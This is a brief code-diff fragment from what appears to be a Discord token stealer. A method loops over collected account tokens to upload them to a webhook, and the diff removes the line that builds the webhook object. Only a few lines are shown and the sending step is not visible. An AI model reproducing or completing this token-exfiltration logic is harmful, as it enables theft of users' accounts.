@@ -118,7 +118,6 @@ class discord():
         return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
 
     def upload_accounts(self, webhook: str) -> None:
-        webhook = SyncWebhook.from_url(webhook)
 
         for token in self.tokens:
             headers = {
